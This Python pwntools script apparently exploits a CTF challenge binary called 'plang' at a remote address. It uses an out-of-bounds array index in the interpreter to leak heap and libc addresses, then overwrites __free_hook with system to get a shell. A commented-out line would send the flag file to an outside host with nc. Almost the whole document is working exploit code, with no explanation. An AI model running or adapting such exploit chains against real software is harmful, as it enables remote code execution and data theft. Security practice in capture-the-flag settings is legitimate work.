#!/usr/bin/env python
from pwn import *
import sys
from time import time, sleep
import ctypes
import threading
import struct
import IPython
from Crypto.Cipher import AES

LOAD_ELFS = True
BINARY = './plang/plang'
LIBC = './plang/libc-2.27.so'
LOCAL_LIBC = '/lib/x86_64-linux-gnu/libc.so.6'
H,P = ('111.186.63.210', 6666)
LEVEL = 'INFO'
#LEVEL = 'DEBUG'

# Set context for asm
context.clear()
context(os='linux', arch='amd64', bits=64)
context.log_level = LEVEL
context.terminal = ['tmux', 'splitw', '-h']

def connection(t):
    if t ==  'remote':
        r = remote(H, P, level=LEVEL)
    else:
        if t == 'local':
                r = process(BINARY, level=LEVEL)
        else:
                r = process(BINARY, env = {'LD_PRELOAD' : '{}'.format(LIBC)}, level=LEVEL)
                #r = process(argv=['./ld-2.23.so', BINARY], env = {'LD_PRELOAD' : '{}'.format(LIBC)}, level=LEVEL)
        #print 'PID: {}'.format(util.proc.pidof(r))
        #pause()
    return r
    
def read_menu(r):
    return r.recvuntil('> ')


def i2d(val):                                     
    return hex(struct.unpack("<Q", struct.pack("<d", val))[0])

def d2i(val):                                     
    return struct.unpack("<d", struct.pack("<Q", val))[0] 

def d2str(val):
    return "{:.2000f}".format(val)

def i2str(val):
    return d2str(d2i(val))


def exploit(elf, libc, local):
    r = connection(local)
    #if local == 'local':
    #    gdb.attach(r, '''
    #    ''')
        

    """
    struct PlangObj{
        long type; // if the obj is a pure double, type is 4, otherwise 5
        union{
            double value;
            obj_ptr* obj;
        };
    };
    

    struct ArrayObj{
        int type;
        int padding;
        void* some_ptr;
        void* some_ptr2;
        PlangObj* buffer_ptr;
        int size; // the buffer_ptr and size are what we care
        int padding2;
    };
    
    struct StringObj{
        int type;
        int padding;
        void* some_ptr;
        void* some_ptr2;
        int some_val;
        int size;
        char[] contents;
    };

    """


    code = """
    var leaker = "CCCCCCCC"
    var evil = ["FOOBAR"]

    evil[-0x24] = "DDDDDDDD"
    var i = 0x68
    var a = 0
    """
    
    # setup
    for l in code.split('\n'):
        read_menu(r)
        r.sendline(l)
        
    
    # leak heap
    read_menu(r)
    r.sendline("while (i < 0x70) { a = leaker[i] System.print(a) i = i + 1 }")
    ret = read_menu(r)
    parts = ret.split('\n')
    heap_leak = ""
    for p in parts:
        if not p:
            break
        heap_leak += p[0]
    heap_leak = heap_leak.ljust(8, '\0')
    heap_addr = u64(heap_leak)
    log.success("heap_leak: " + hex(heap_addr))
    heap_base = heap_addr - 0x7890
    log.success("heap_base @ " + hex(heap_base))
   
  
    # leak libc
    r.sendline("var tmp = \"" + "Z"*0x80 + "\"")
    read_menu(r)
    
    r.sendline("var j = 0x1408")
    read_menu(r)
    r.sendline("while (j < 0x1410) { a = leaker[j] System.print(a) j = j + 1 }")
    ret = read_menu(r)
    parts = ret.split('\n')
    libc_leak = ""
    for p in parts:
        if not p:
            break
        libc_leak += p[0]
    libc_leak = libc_leak.ljust(8, '\0')
    libc_addr = u64(libc_leak)
    log.success("libc_leak: " + hex(libc_addr))
    libc.address = libc_addr - 0x3ebd20
    log.success("libc @ " + hex(libc.address))
   

    # get rip control
    r.sendline("var writer = [0.1]")
    read_menu(r)
    r.sendline("var setter = [0.1]")
    read_menu(r)
    writer_data_ptr = libc.symbols['__free_hook'] - 0x8
    log.info("new data_ptr = " + hex(writer_data_ptr))
    r.sendline("setter[-0xb] = " + i2str(writer_data_ptr))
    read_menu(r)
    r.sendline("writer[0] = " + i2str(libc.symbols['system']))
    read_menu(r)
    
    #r.sendline("var foo = \"nc 131.188.31.51 3104 < /plang/flag\"")
    r.sendline("var foo = \"/bin/sh\"")
    r.interactive()
    


if __name__ == '__main__':
    if LOAD_ELFS:
        elf = ELF(BINARY)
    else:
        libc = None

    if len(sys.argv) < 2:
        print 'Usage: {} local|docker|remote'.format(sys.argv[0])
        sys.exit(1)
    elif sys.argv[1] == 'remote':
        if LOAD_ELFS:
            libc = ELF(LIBC)
        else:
            libc = None
        exploit(elf, libc, sys.argv[1])
    else:
        if sys.argv[1] == 'local':
            if LOAD_ELFS:
                libc = ELF(LOCAL_LIBC)
            else:
                libc = None
        else:
            if LOAD_ELFS:
                libc = ELF(LIBC)
            else:
                libc = None
        exploit(elf, libc, sys.argv[1])
